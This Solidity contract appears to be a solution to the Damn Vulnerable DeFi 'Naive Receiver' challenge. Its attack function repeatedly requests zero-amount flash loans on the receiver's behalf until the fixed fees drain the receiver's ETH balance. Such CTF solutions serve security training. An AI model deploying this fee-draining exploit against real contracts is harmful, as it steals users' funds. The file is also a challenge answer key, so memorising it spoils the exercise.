// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./FlashLoanReceiver.sol";
import "./NaiveReceiverLenderPool.sol";

/**
 * @title FlashLoanReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FlashLoanAttacker {

    /**
     * @dev constants & public variables
     * - receiver is the address of the naive flash loan receiver contract passed at construction
     * - ETH is the address of the token being loaned hardcoded in the other 2 contracts
     * - FIXED_FEE is the fee on the lending pool contract
     */
    FlashLoanReceiver private receiver;
    NaiveReceiverLenderPool private pool;
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    uint256 private constant FIXED_FEE = 1 ether; // not the cheapest flash loan

    /**
     * pass in the address of the pool and the receiver contract
     */
    constructor(address payable _pool, address payable _receiver) {
        pool = NaiveReceiverLenderPool(_pool);
        receiver = FlashLoanReceiver(_receiver);
    }

    /**
     * attack will check the balance of the receiver and continuously call a flash loan for it until it is drained
     */
    function attack() public {
        uint256 rem_balance = address(receiver).balance;
        bytes memory _data = '0x1';
        while (rem_balance > 0) {
            pool.flashLoan(
                receiver,
                ETH,
                0,
                _data
            );
            rem_balance = address(receiver).balance;
        }
    }
}